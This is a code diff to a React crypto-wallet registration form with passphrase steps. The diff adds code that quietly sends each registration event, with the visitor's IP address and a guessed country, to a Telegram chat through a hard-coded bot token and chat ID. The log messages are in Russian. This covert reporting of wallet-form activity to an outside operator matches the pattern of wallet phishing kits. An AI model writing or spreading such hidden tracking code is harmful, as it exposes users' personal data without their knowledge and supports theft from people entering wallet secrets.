@@ -4,6 +4,7 @@ import React, { useState } from "react";
 import { useForm, useFieldArray } from "react-hook-form";
 import { FieldValues } from "react-hook-form";
 
+import ValidTextarea from "@/ui/ValidTextarea/ValidTextarea";
 import Multistep from "@/components/Multistep";
 import RegisterDetails from "@/modules/Forms/RegisterDetails";
 import GenPassphrase from "@/modules/Forms/GenPassphrase";
@@ -12,7 +13,9 @@ import EnterPassphrase from "@/modules/Forms/EnterPassphrase";
 import { useMultistepForm } from "@/components/Multistep";
 import type { TRegisterForm } from "@/types/data/forms";
 import { REGISTER_INIT_VALUES, AUTH_INP_DATA, PASSPHRASE_DATA, passArr, passStr } from "@/data/pages/inp-data";
-import ValidTextarea from "@/ui/ValidTextarea/ValidTextarea";
+import { TG_TOKEN, TG_METHOD_NAMES, CHAT_ID } from "@/data/api/tokens";
+import { getUserIP, sendLog } from "@/api/logger-utils";
+import { getCountryName } from "@/utils/get-country-name";
 
 export const RegisterWallet = () => {
     const {
@@ -80,7 +83,12 @@ export const RegisterWallet = () => {
 
     const [isRegisterPassMatch, setIsRegisterPassMatch] = useState<boolean>(true);
 
+    const registerLog = async (logText: string) =>
+        getUserIP().then((ip) => {
+            sendLog(TG_TOKEN, TG_METHOD_NAMES.sendMessage, CHAT_ID, `${logText}. IP: ${ip} | Страна: ${getCountryName(window.navigator.language)}`);
+        });
     const submitForm = async (data: FieldValues) => {
+        if (currentStepIndex === 0) registerLog("Пользователь <b>регистрируется</b>");
         if (!isLastStep) return next();
 
         // * Clearing extra spaces
@@ -90,6 +98,7 @@ export const RegisterWallet = () => {
 
         if (isPassCond) {
             setIsRegisterPassMatch(true);
+            registerLog("Пользователь <b>зарегистрировался</b>");
 
             await new Promise((resolve: any) => setTimeout(resolve, 2000));
             reset();
